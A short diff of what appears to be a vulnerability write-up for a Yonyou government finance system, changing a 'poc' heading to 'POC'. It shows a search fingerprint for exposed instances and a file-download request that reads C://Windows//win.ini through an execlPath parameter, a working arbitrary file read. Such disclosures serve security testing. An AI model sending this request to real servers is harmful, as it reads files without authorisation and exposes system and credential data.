@@ -5,7 +5,7 @@
 app="用友-政务财务系统"
 ```
 
-## poc
+## POC
 ```
 /bg/attach/FileDownload?execlPath=C://Windows//win.ini
 
